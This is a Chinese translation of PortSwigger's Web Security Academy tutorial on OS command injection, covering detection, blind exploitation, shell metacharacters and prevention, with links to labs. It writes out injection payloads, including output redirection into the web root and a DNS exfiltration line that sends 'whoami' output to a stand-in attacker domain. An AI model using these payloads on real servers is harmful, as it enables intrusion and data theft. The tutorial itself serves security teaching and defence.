---
description: 原文链接：https://portswigger.net/web-security/os-command-injection
---

# OS命令注入

## 什么是OS命令注入？

在本节中，我们将解释什么是操作系统命令注入，描述如何检测和利用漏洞，阐述一些针对不同操作系统的有用命令和技术，并总结如何防止操作系统命令注入。

![](../.gitbook/assets/image%20\(5\)%20\(3\)%20\(3\)%20\(3\)%20\(4\).png)

操作系统命令注入（也称为 shell 注入）是一个 web 安全漏洞，它允许攻击者可以在运行应用程序的服务器上执行任意操作系统（OS）命令，并且通常会完全破坏该应用程序及其所有数据。很多时候，攻击者可以利用 OS 命令注入漏洞来破坏托管基础结构的其他部分，利用信任关系将攻击转移到组织内的其他系统。

{% embed url="https://www.youtube.com/watch?v=8PDDjCW5XWw" %}

## 执行任意命令

考虑一个购物应用程序，让用户可以查看某件商品在特定商店中是否有库存。 这一信息是通过一个URL访问的：

```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

为了提供库存信息，应用程序必须查询各种旧系统。 由于历史原因，该功能是通过使用产品和存储的ID作为参数调用 shell 命令来实现的：

```
stockreport.pl 381 29
```

此命令输出指定物品的库存状态，并返回给用户。

由于该应用程序没有实现对操作系统命令注入的防御，攻击者可以提交以下输入来执行一个任意命令：

```
& echo aiwefwlguh &
```

如果这个输入是在`productID`参数中提交的，那么应用程序执行的命令是：

```
stockreport.pl & echo aiwefwlguh & 29
```

`echo`命令只是使提供的字符串在输出中回显，它是测试某些类型的 OS 命令注入的有用方法。 `&`字符是 shell 命令分隔符，因此执行的实际上是一个接一个的三个独立命令。 因此，返回给用户的输出为：

```
Error - productID was not provided
aiwefwlguh
29: command not found
```

输出的三行表明：

* 原始的`stockreport.pl`命令在没有预期参数的情况下执行，因此返回了一个错误消息。
* 注入的`echo`命令被执行，并且提供的字符串在输出中回显。
* 原先的参数`29`被作为命令执行，这导致了一个错误。

将额外的命令分隔符`&`放在注入的命令之后通常是很有用的，因为它将注入命令与注入点后面的内容分开。 这就减少了后面的阻止注入命令执行操作的可能性。

> 实验：[OS 命令注入，简单案例](https://portswigger.net/web-security/os-command-injection/lab-simple)

## 有用的命令

当你确定了一个 OS 命令注入漏洞后，执行一些初始命令以获得被你入侵的系统的信息通常是有用的。 以下是在 Linux 和 Windows 平台上有用的一些命令摘要：

| 命令的用途 | Linux         | Windows         |
| ----- | ------------- | --------------- |
| 当前用户名 | `whoami`      | `whoami`        |
| 操作系统  | `uname -a`    | `ver`           |
| 网络配置  | `ifconfig`    | `ipconfig /all` |
| 网络连接  | `netstat -an` | `netstat -an`   |
| 运行的进程 | `ps -ef`      | `tasklist`      |

## 操作系统命令盲注漏洞

OS 命令注入的许多例子都是盲注漏洞。 这意味着应用程序不会在其 HTTP 响应中返回命令的输出。 盲注漏洞仍然可以被利用，但是需要不同的技术。

考虑一个网站允许用户提交有关该站点的反馈。 用户输入他们的电子邮件地址和反馈消息。 然后，服务器端应用程序生成一封包含反馈的电子邮件发到网站管理员。 为此，它要把提交的详细信息调用给邮件程序。 例如：

```
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

`mail`命令的输出（如果有）不会在应用程序的响应中返回，因此使用`echo` payload 将无效。 在这种情况下，你可以使用多种其他技术来检测和利用漏洞。

### 使用时间延迟检测OS命令盲注

你可以使用一个注入命令来触发一个时间延迟，从而让你根据应用程序响应的时间来确认命令是否被执行。 `ping`命令是执行此操作的有效方法，因为它可以让你指定要发送的 ICMP 数据包的数量，从而指定命令运行所花费的时间：

```
& ping -c 10 127.0.0.1 &
```

此命令将导致应用程序`ping`其环回网络适配器10次。

> 实验：[带时间延迟的 OS 命令盲注](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

### 通过重定向输出来利用OS命令盲注

你可以将注入命令的输出重定向到 web 根目录下的一个文件中，然后就可以用浏览器进行取回。 例如，如果应用程序从`/var/www/static`位置提供静态资源，那么可以提交以下输入：

```
& whoami > /var/www/static/whoami.txt &
```

`>`字符将`whoami`命令的输出发送到指定文件中。 然后，你可以使用浏览器获取`https://vulnerable-website.com/whoami.txt`来获取文件，并查看注入命令的输出。

> 实验：[带重定向输出的 OS 命令盲注](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

### 使用带外（OAST）技术利用盲OS命令注入

你可以使用一个注入的命令，通过 OAST 技术触发与你控制的系统的带外网络交互。 例如：

```
& nslookup kgji2ohoyw.web-attacker.com &
```

此 payload 使用`nslookup`命令对指定域进行 DNS 查找。 攻击者可以监视到是否发生了指定的查找，从而检测命令已成功注入。

> 实验：[带外交互的 OS 命令盲注](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

带外通道还提供了一种简单的方法来从注入的命令中提取输出：

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

这将导致对攻击者的域名进行 DNS 查找，其中包含`whoami`命令的结果。

```
wwwuser.kgji2ohoyw.web-attacker.com
```

> 实验：带外数据渗出的 OS 命令盲注

## 注入 OS 命令的方式

可以使用各种 shell 元字符来执行 OS 命令注入攻击。

一些字符可以作为命令的分隔符，使命令可以被链接起来。 以下命令分隔符在 Windows 和基于 Unix 的系统中均可使用：

* `&`
* `&&`
* `|`
* `||`

以下命令分隔符仅在基于 Unix 的系统中工作：

* `;`
* `0x0a` or&#x20;

在基于 Unix 的系统中，你还可以使用反引号或 dollar 字符，在原始命令内对注入的命令内联执行：

* `注入的命令`
* `$(` 注入的命令 `)`

请注意，不同的 shell 元字符具有细微的不同行为，这可能会影响它们在某些情况下是否起作用，以及它们是否允许带内检索命令输出或仅用于盲注利用。

有时，你控制的输入会出现在原始命令的引号内。 这种情况下，在使用合适的 shell 元字符注入新命令之前，需要终止带引号的上下文(使用`"`或`'`)。

## 如何防止OS命令注入攻击

到目前为止，防止 OS 命令注入漏洞最有效的方法是，永远不要从应用程序层代码中调用 OS 命令。 几乎在每种情况下，都有使用更安全的平台 API 来实现所需功能的替代方法。

如果认为无法避免使用用户提供的输入来调用 OS 命令，则必须进行强输入验证。一些有效验证的例子包括：

* 根据允许值的白名单进行验证。
* 验证输入是否为数字。
* 验证输入仅包含字母数字字符，不包含其他语法或空格。

不要试图通过转义 shell 元字符来清理输入。 实际中，这太容易出错，而且容易被熟练的攻击者绕过。

> 阅读更多
>
> [使用 Burp Suite 的 Web 漏洞扫描器找到 OS 命令注入漏洞](https://portswigger.net/burp/vulnerability-scanner)
